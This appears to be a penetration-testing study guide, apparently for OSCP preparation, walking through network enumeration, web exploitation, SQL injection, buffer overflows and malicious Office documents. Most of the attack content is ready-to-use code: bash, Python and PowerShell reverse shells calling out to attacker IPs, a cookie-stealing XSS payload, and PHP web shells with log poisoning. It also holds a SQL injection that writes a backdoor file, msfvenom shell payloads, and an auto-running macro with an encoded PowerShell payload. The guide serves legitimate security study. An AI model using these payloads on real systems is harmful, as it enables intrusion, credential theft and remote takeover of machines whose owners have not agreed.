https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/

Try further enumeration via `smbclient`:
```
smbclient -W <Workgroup> //'<IP>'/ipc$ -U'test'%'123456'
smbclient -L <IP>
```
https://bestestredteam.com/2019/03/15/using-smbclient-to-enumerate-shares/

Symlink Directory Traversal:
https://github.com/MarkBuffalo/exploits/blob/master/Samba/CVE-2010-0926.c

Use `wireshark` to capture packets after executing `smbclient`, and follow `TCP` stream. 

Try anonymous credentials as well in case they allow for anonymous logins. You may try `smbmap` if `smbclient` does not work:
```
smbmap -H 10.11.1.31 -u anonymous -p anonymous -R
```
https://arnavtripathy98.medium.com/smb-enumeration-for-penetration-testing-e782a328bf1b

### NFS Enumeration
Use `nmap` to scan port 111:
```
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
```
We can use the script `rpcinfo` to find services that may have registered with rpcbind (i.e. NFS).

Other NFS scripts can be found in `/usr/share/nmap/scripts/nfs`. You can utilise all scripts with `*`:
```
nmap -p 111 --script=nfs* 10.11.1.72
```

#### **Mounting NFS drives*
```
mkdir home

sudo mount -o nolock 10.11.1.72:/home ~/home/

cd home/ && ls
```
`-o nolock` to disable file locking, which is needed for older NFS servers

#### **Adding new user and changing UUID to match owner UUID of a file for permissions*
```
sudo adduser pwn

sudo sed -i -e 's/1001/1014/g' /etc/passwd
cat /etc/passwd | grep pwn
```
The `-i` option is used to replace the file in-place and the `-e` option executes a script. In this case, that happens to be `s/1001/1014/g`, which will globally replace the UUID in the `/etc/passwd` file.

Use `su` to switch to the new user, and try to access file.

### SMTP Enumeration
Scan port 25 for SMTP:
```
nc -nv 10.11.1.217 25
```
Use `telnet` to connect to the SMTP server:
```
telnet <IP> <port>
```
The SMTP server will verify if a user exists if we use `VRFY <user>`.

Consider the following Python script that opens a TCP socket, connects to the SMTP server, and issues a VRFY command for a given username:
```
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 2:
        print "Usage: vrfy.py <username>"
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
connect = s.connect(('10.11.1.217',25))

# Receive the banner
banner = s.recv(1024)

print banner

# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result = s.recv(1024)

print result

# Close the socket
s.close()
```

Can use `smtp-user-enum`.

### SNMP Enumeration
Windows SNMP Management Information Base (MIB) Values:
![](https://i.imgur.com/teOC7Xc.png)

Scan port 161:
```
sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
```
`--open` option is used to limit the output to only display open ports.

Or we can use `onesixtyone` to brute force a list of IPs:
```
echo public > community
echo private >> community
echo manager >> community

for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips

onesixtyone -c community -i ips
```
Once we find SNMP services, we can start querying them for specific MIB data that might be interesting.

#### Querying SNMP Values
Use `snmpwalk` to enumerate the entire MIB tree:
```
snmpwalk -c public -v1 -t 10 10.11.1.14
```
`-c` option to specify the community string, `-v` to specify the SNMP version number
`-t 10` to increase the timeout period to 10 seconds

Enumerate just Windows users:
```
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
```

Enumerate running Windows processes:
```
snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
```

Enumerate open TCP ports:
```
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
```

Enumerate installed software:
```
snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
```

## Vulnerability Scanning
### Nessus
https://www.tenable.com/downloads/nessus
Start service after installing `.deb` (amd):
```
sudo /bin/systemctl start nessusd.service
```
### Nmap
Scripts can be found in `/usr/share/nmap/scripts`. `script.db` shows an index of scripts. You can run all scripts in a certain category, in this case of vulnerability scanning, you can use `--script vuln`.

## Web Application Attacks
### Web Application Enumeration
https://usermanual.wiki/Document/Offensive20Securitys20Complete20Guide20to20Alpha.546296816/view
1. Inspect URL extensions
2. Inspect content elements (browser developer tools)
- Can right click to view a specific element
3. Inspect response headers (browser network inspector)
- Response headers that start with 'X' is a non-standard HTTP header - it may reveal additional information
4. Inspect sitemap files like `robots.txt` and `sitemap.xml`
- Look for pages that are marked as unavailable for access
-	`curl` as search engine to read `robots.txt` https://gist.github.com/chrisle/2252209 
5. Locate administration consoles
- `/phpmyadmin` for MySQL
- `/manager/html` for Tomcat 
6. `curl -i <URL>` to check headers for more information

### Enumeration Tools
#### DIRB
Searches for directories based on wordlist
```
dirb http://www.megacorpone.com -r -z 10
```
`-r` scans non-recursively
`-z` adds milisecond delay
`-w` ignores warning messages

`gobuster` is probably better.
```
gobuster dir -u <URL> -w <wordlist>
```
https://abrictosecurity.com/gobuster-directory-enumerator-cheat-sheet/
Remember to search for `CGIs`. Wordlist can be found in `/usr/share/seclists/Discovery/Web_Content/CGIs.txt`.

https://sushant747.gitbooks.io/total-oscp-guide/content/web-scanning.html

#### Burp Suite
1. Proxy tool - Use the FoxyProxy add-on to link the Burp Proxy to the browser (Or just use the Chromium browser from Burp)
2. Intercept tool
3. Use the Burp Suite self-signed CA for HTTPS links
4. Repeater tool to send repeated requests to get server response

#### Nikto
Example:
```
nikto -host=http://www.megacorpone.com -maxtime=30s
```
Not a stealthy scanner, but can scan vulnerabilities.

### Exploiting Web-based Vulnerabilities
#### Burp Suite Brute Force
Use the Intruder tool
- *Positions* tab to set the payload positions
- Set attack type to *Pitchfork*
- Recursive `grep`
- Set payloads and run
Refer to OSCP 9.5.1.

#### Cross-Site Scripting (XSS)
- Simple alert:
```
<script>alert('XSS')</script>
```
- Embed another file (to perform client-side attack)
This example forces the user's browser to connect to the `src`.
```
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
```
- Cookies and Session Info
The Secure3 flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in cleartext and captured over the network.

The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

Example payload:
```
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```
JavaScript creates an image that appends the cookie. The browser will do a GET request with the cookie appended.

Leave a listener for the GET request:
```
sudo nc -nvlp 80
```

You can then add the cookie using a cookie editor (e.g. FireFox)

#### Directory Traversal
Examination of URL query strings and form bodies in search of values that appear as file references, including the most common indicator: file extensions in URL query strings. E.g.`http://192.168.187.10/menu.php?file=menu.php` Change the query to a directory of your choosing
- /etc/passwd 
- c:/boot.ini

#### Local File Inclusion
Local file inclusions (LFI) occur when the included file is loaded from the same web server. Remote file inclusions (RFI) occur when a file is loaded from an external source. 
https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
https://www.exploit-db.com/exploits/49343
Add null byte `%00` at the end of the path.
```
/xxx.php?page=<directory>
```
OR
```
/xxx.php?file=<filelocation>
```
Remember to add the nullbyte `%00` to avoid appending `.php`. This will only work on `php` before version 5.3.

Poison the access.log file to execute certain commands and let the server execute the locally stored log file, Open a web shell to the web server:
```
nc -nv 10.11.0.22 80
```
Execute the following:
```
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

We can then amend the directory to include commands:
```
http://10.11.0.22/menu.php?file=<directory>\access.log&cmd=<command>
```
https://book.hacktricks.xyz/pentesting-web/file-inclusion

#### Remote File Inclusion
Less common, but same concept. Input a URL in the query to retrieve a remote file. Remote file can contain payload.
```
/xxx.php?file=<URL of file>
```
Open a listener on the web server that hosts this file and run the URL query above. Example:
```
http://10.11.0.22/menu.php?file=<URL of file>&cmd=<command>
```
E.g.
```
<?php echo shell_exec($_GET['cmd']); ?>
```
A reverse shell code to use:
```
<?php echo shell_exec("bash -i >& /dev/tcp/192.168.45.217/4444 0>&1"); ?>
```
**Note:** If using RFI and hosting the file on host machine, it is required to rename file extension to `.txt` instead of `.php`, otherwise the shell will be on the host machine instead.

#### Kali Webshells
Found in `/usr/share/webshells`
https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html

#### Powershell Reverse Shell
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444
```

#### Reverse Shell Cheatsheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

*Sometimes you need to escape the characters when writing `nc.exe` to a public folder, e.g. `wget http://IP/nc.exe -O C:\\Users\\Public\\nc.exe`
Powershell version: `powershell.exe wget http://192.168.119.138/nc.exe -OutFile c:\\Users\\Public\\nc.exe`

#### Crafted Payloads
Using `msfvenom`:

https://medium.com/@nmappn/msfvenom-payload-list-77261100a55b
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
Create specific payloads for reverse shell!

You need a staged payload to connect to `nc`.

Can also create payloads that execute a root shell (for SUID binaries relative path vulnerability):
`msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o <command in SUID strings>`
(https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst)

#### LFI to RCE
For the following examples I will be using this payload to execute system commands:
```
<?php system($_GET['cmd']); ?>
```
And this one, to receive a reverse shell:
```
python -c socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1

#### Additional Notes
```
# Execute one command
<?php system("whoami"); ?>

# Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>

# The same but using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?>
<?php echo shell_exec($_GET["cmd"]); exit; ?> >> xx.php&cmd=xyz

# Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

# Instead to this if you can. It will return the output as an array, and then print it all.
<?php exec("ls -la",$array); print_r($array); ?>

# preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

# Using backticks
<?php echo `whoami`; ?>

# Reverse shell
<?php echo shell_exec("bash -i >& /dev/tcp/192.168.45.217/443 0>&1"); ?>

# Run multiple commands in one line
<?php system("wget http://192.168.119.149/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
- Semi-colon is important
```
#### Extras
Starting an HTTP server on an arbitrary port in Python 2.x:
```
python -m SimpleHTTPServer 7331
```
Python 3.x:
```
python3 -m http.server 7331
```
PHP:
```
php -S 0.0.0.0:8000
```
Ruby:
```
ruby -run -e httpd . -p 9000
```
`busybox`
```
busybox httpd -f -p 10000
```

**Note**: For Wordpress, edit the Theme's `404.php`

#### PHP Wrappers
Data wrappers can be used to execute code directly:
```
http://10.11.0.22/menu.php?file=data:text/plain,hello world
```
```
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

#### Command Injection Cheatsheet
https://hackersonlineclub.com/command-injection-cheatsheet/
The following special character can be used for command injection such as | ; & $ > < ' !

    cmd1|cmd2 : Uses of | will make command 2 to be executed whether command 1 execution is successful or not.
    cmd1;cmd2 : Uses of ; will make command 2 to be executed whether command 1 execution is successful or not.
    cmd1||cmd2 : Command 2 will only be executed if command 1 execution fails.
    cmd1&&cmd2 : Command 2 will only be executed if command 1 execution succeeds.
    $(cmd) : For example, echo $(whoami) or $(touch test.sh; echo 'ls' > test.sh)
    cmd : It’s used to execute a specific command. For example, whoami
    >(cmd): >(ls)
    <(cmd): <(ls)


### SQL Injection
Questions to consider:
1. String based or integer based?
2. What type of DB? MSSQL? MySQL? PostgreSQL?
3. References: 
https://portswigger.net/support/using-sql-injection-to-bypass-authentication
https://portswigger.net/web-security/sql-injection/cheat-sheet
Error-based
https://infosecwriteups.com/exploiting-error-based-sql-injections-bypassing-restrictions-ed099623cd94
Union-based
https://portswigger.net/web-security/sql-injection/union-attacks
https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
MSSQL - https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
MSSQL (string or integer?) - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based
1. **Identifying SQL Injection Vulnerabilities**
We can use the single quote `'`, which SQL uses as a string delimiter, as a simple check for potential SQL injection vulnerabilities. If the application doesn’t handle this character correctly, it will likely result in a database error and can indicate that a SQL injection vulnerability exists. Knowing this, we generally begin our attack by inputting a single quote into every field that we suspect might pass its parameter to the database.
2. **Authentication Bypass**
Use `' or 1=1;#` together with the username, i.e. `tom' or 1=1;#`. This comments out the password string and leaves the authentication to `tom' or 1=1` which is `True`.

    If errors are met, we can limit the query to return a fixed number of records with `LIMIT`. `tom' or 1=1 LIMIT1;#`.
    
Can try `' or 1=1 --`.

Can also put a random username and directly inject in the password box, e.g. `' UNION SELECT NULL--'

3. **Enumeration Database**
As usual, use the `'` to the value of the `id` parameter. If an error appears, the database is vulnerable:
```
http://10.11.0.22/debug.php?id='
```
4. **Column Number Enumeration**
Add `order by 1` to the `id` parameter:
```
http://10.11.0.22/debug.php?id=1 order by 1
```
Use Burp Suite (Proxy > Repeater) to repeat the `by 1` increasingly until an error appears, which tells you the number of columns in the database.

5. **UNION**
Use the `UNION` statement to add a second `select` statement to the original query:
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3
```
This means "1", "2", "3" will be loaded in their respective columns. In this example, column 1 is hidden. 

This will load the DB version in the third column:
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
```

This will output the current database user:
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
```

This will output information about the database (table names):
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
```

Supposing there is a `users` table, we can extract column names in the table:
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```

And we can then extract from the columns within, e.g. the usernames and passwords:
```
http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
```

6. **Code Execution from SQL Injection**
This loads a file on the server:
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

This creates a malicious PHP file in the server's web root:
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
You can then execute commands:
```
http://10.11.0.22/backdoor.php?cmd=<command>
```

7. **Automating SQL Injection**
`sqlmap` is the one. Examples:
```
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
```
`-u` - sets the URL
`-p` - sets the parameter
`-dbms` - sets the database type
`--dump` - dumps the contents of all tables
`--os-shell` - run commands on the server

**Note**: `sqlmap` is not allowed in OSCP.

Oracle DB: https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573
https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener

#### SQL vulnerabilities:
Can check for direct logging into SQL via vulnerabilities:

MSSQL
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
https://pentestsector.com/docs/1.0/services/1443-mssql
- Try to get the `master.mdf` database which holds all the info, if possible
- `master.mdf` directory: https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/
- `master.mdf` is unavailable if the SQL server is currenly running, so need to go to the backup directory
- If `tftp` is available, since its unauthenticated, it can be used to obtain `master.mdf`:
```
tftp> mode binary
tftp> get ..\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
```
- `python` can be used in conjunction with `tftp` as well:
```
pip install tftpy

python

Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import tftpy
>>> client = tftpy.TftpClient('192.168.1.20', 69)
>>> client.download('\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf', 'master.mdf')
```
- https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes
```
In pwsh (Linux) or Powershell (Win)

Add-Type -Assembly ./OrcaMDF.Framework.dll
Add-Type -Assembly ./OrcaMDF.RawCore.dll
Import-Module Get-MDFHashes.ps1
./Get-MDFHashes.ps1 -mdf "<file location>"

Output should be hashes
``` 
- https://github.com/xpn/Powershell-PostExploitation/pull/2
	- Add in `$currentLocation`
- Crack the `sa` hash with `john`, and login with `sa` being the username
- Run `xp_cmdshell` to perform RCE as admin in MSSQL database (https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell/)

Can also check if current user has `sysadmin`, and stacked queries, and run `xp_cmdshell` to perform RCE from there:
https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- Remember to enable `xp_cmdshell` before executing

MySQL
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql

Logging in to `MySQL` database:
```
mysql --host=127.0.0.1 --port=13306 --user=wp -p
```
Example above is after port forwarding is set up via kali's port 13306 to an external database, hence the host is `127.0.0.1`.

Can also use `sqsh`:
```
sqsh -S <IP> -U <Username> -P <Password>

Type commands and 'go' to execute
```
http://infolab.stanford.edu/~ullman/fcdb/aut96/sy-intro.html


## Buffer Overflows
![](https://i.imgur.com/Ded8SHK.png)
![](https://i.imgur.com/gN4exnW.png)
### Windows Buffer Overflow
Stack-based buffer overflow
https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/
1. Determine the byte length that writes into EIP (and crashes the service) / find the offset
Python fuzzing script (can be changed based on the parameters found when intercepting login traffic):

*Use `python2` if needed*

```
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()
```
Code above sends HTTP POST requests at 10-second intervals at increasing sizes. Once it crashes we know roughly what the buffer amount is. A debugger must be attached in conjunction to catch potential access violation.
- Immunity Debugger (Listening column to find the service and attach the service to the debugger. Remember to run in admin privileges)
- Microsoft TCPView (Uncheck *Resolve Addresses* from the *Options* menu to find the service)

Once you find out the byte length, the script can be amended to send only of a certain size.

An alternative is to use `msf-pattern_create -l <bytesize>`. Use the output as the buffer input and ultimately determine which 4 bytes end up in the EIP. Then you can use `msf-pattern_offset -l <bytesyze> -q <EIP HEX value>` to determine the offset, so that you can input your custom address subsequently.

2. Bad Characters
0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D

0x00 is always bad - NULL.

If you need to test, include this in your script:
```
badchars = (
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```
Follow ESP in Dump to check on which hexadecimals made it onto stack memory.


3. JMP ESP

- SafeSEH2 (Structured Exception Handler Overwrite, an exploit-preventative memory protection technique), ASLR, and NXCompat (DEP protection) has to be disabled.
- Address must not contain bad characters as well.

> ESP points directly to the start of your payload (after execution of the ret in the function you're attacking) because you put the payload right after the 4 bytes that overwrite the return address on the stack. ret pops 4 (or 8) bytes into EIP, leaving ESP pointing to the payload that directly follows.
> 
>But you don't know what value ESP will have at that point, because of stack ASLR and because a different depth of call stack leading up to this point could change the address. So you can't hard-code a correct return address.
>
>But if there are bytes that decode as jmp esp or call esp anywhere at a fixed (non-ASLRed) address in the process's memory, you can hard-code that address as the return address in your exploit. Execution will go there, then to your payload.
>
>https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack

4. Write the appropriate address on the EIP to point to your shellcode to run

5. Shellcode

'msfvenom' has over 500 payloads. When generic shellcode cannot be used, it must be encoded to suit the target environment. 'shikata_ga_nai' is an advanced polymorphic encoder that is used. E.g.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
Add in a series of NOPs to create a wide "landing pad" before the shellcode. NOPs are `0x90`.

`-f` specifies format. Use `-f c` for `c` code, and `-f raw` for raw bytes.

`LHOST` and `LPORT` is the destination IP (your attacker IP).

Use the `EXITFUNC=thread` to terminate the affected thread and repeatedly exploit the server without bringing down the service.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

### Linux Buffer Overflow
Network-based buffer overflow
1. Finding EIP

Same concept, find the EIP by using msf-pattern_create -l <bytesize>`. Use the output as the buffer input and ultimately determine which 4 bytes end up in the EIP. Then you can use `msf-pattern_offset -l <bytesyze> -q <EIP HEX value>` to determine the offset, so that you can input your custom address subsequently.

## Client-Side Attacks
1. Information gathering
- Passive client information gathering - using known corporate IPs to determine versioning information (browser, OS)
- Active client information gathering - social engineering + usage of links and macros
- Client fingerprinting

There are many open-source fingerprinting projects. One example is *Fingerprintsjs* JS library. Install it:
```
sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
sudo unzip master.zip
sudo mv fingerprintjs2-master/ fp
```
We can incorporate into `index.html` located in `/var/www/html/fp` of our web server (refer to 13.1.4. of notes)
    
Identify User Agent string, e.g. 
```
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/58.0.3029.110 Safari/537 Edge/16.16299
```
And run it through an online user agent database to identify the browser version and OS.
    
-----------------------------
*Info above might be outdated*
Install `fingerprint2` library:
```
cd /var/www/html/ && sudo wget https://github.com/fingerprintjs/fingerprintjs/archive/2.1.4.zip && sudo unzip 2.1.4.zip && sudo mv fingerprintjs-2.1.4/ fp/ && cd fp
```
Use the following for `index.html`:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Fingerprintjs2 test</title>
  </head>
  <body>
    <h1>Fingerprintjs2</h1>
    <p>Your browser fingerprint: <strong id="fp"></strong></p>
    <p><code id="time" /></p>
    <p><span id="details" /></p>
    <script src="fingerprint2.js"></script>
    <script>
      var d1 = new Date();
      var options = {};
      Fingerprint2.get(options, function (components) {
        var values = components.map(function (component) {
          return component.value;
        });
        var murmur = Fingerprint2.x64hash128(values.join(""), 31);
        var d2 = new Date();
        var timeString =
          "Time to calculate the fingerprint: " + (d2 - d1) + "ms";
        var details = "<strong>Detailed information: </strong><br />";
        if (typeof window.console !== "undefined") {
          for (var index in components) {
            var obj = components[index];
            var value = obj.value;
            if (value !== null) {
              var line = obj.key + " = " + value.toString().substr(0, 150);
              details += line + "<br />";
            }
          }
        }
        document.querySelector("#details").innerHTML = details;
        document.querySelector("#fp").textContent = murmur;
        document.querySelector("#time").textContent = timeString;
      });
    </script>
  </body>
</html>
```
    
Create `js.php` in `/var/www/html/fp`:
```
<?php
$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= file_get_contents('php://input');
$data .= "---------------------------------\n\n";
file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
?>
```
    
-----

2. Leveraging HTML Applications

They use the `.hta` extension instead of `.html`. Affects mostly IE or Edge. Example `evil.hta` generated by `msfvenom`:
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```
`evil.hta` will be hosted on our web server, and if user browses it on their client, a connection will be established.

Just leaving it here the command to generate reverse shell for exe:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.166 LPORT=4444 -f exe -o rev.exe
```
    
3. Microsoft Office
    
#### Macros
Save the document as either `.docm` or `.doc`, as `.docx` is not supported.
> In the real world, if the victim does not click Enable Content, the attack will fail. To overcome this, the victim must be unaware of the potential consequences or be sufficiently encouraged by the presentation of the document to click this button.

In this example, the PowerShell script has been base-64 encoded, and split into multiple strings and concenated as 255 is the limit for one string:
```
    Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA="

    CreateObject("Wscript.Shell").Run Str
End Sub
```
#### Object Linking and Embedding
    
> Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange (DDE)1 to execute arbitrary applications from within Office documents,2 but this has been patched since December of 2017.3
>
>However, we can still leverage Object Linking and Embedding (OLE)4 to abuse Microsoft Office's document-embedding feature.
>
>In this attack scenario, we are going to embed a Windows batch file5 inside a Microsoft Word document.
>
>Windows batch files are an older format, often replaced by more modern Windows native scripting languages such as VBScript and PowerShell. However, batch scripts are still fully functional even on Windows 10 and allow for execution of applications.

Insert > Object > Create from File > Change Icons/Caption
    
```
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```
    
## Public Exploits

Online Databases:
    1. https://www.exploit-db.com/
    2. https://www.securityfocus.com/
    3. https://packetstormsecurity.com/
    4. Using Google, e.g.
```
firefox --search "Microsoft Edge site:exploit-db.com"
```

Offline Databases:
    1. Exploit DB archives. found in `/usr/share/exploitdb` (install if required), use `searchsploit` to search through
    2. NSE scripts, found in `/usr/share/nmap/scripts`
    3. Browser Exploitation Framework (BeEF), accessed using `beef-xss` command, browse to `http://127.0.0.1:3000/ui/panel` with credentials `beef/beef`
    4. Metasploit framework, accessed with `msfconsole`

---
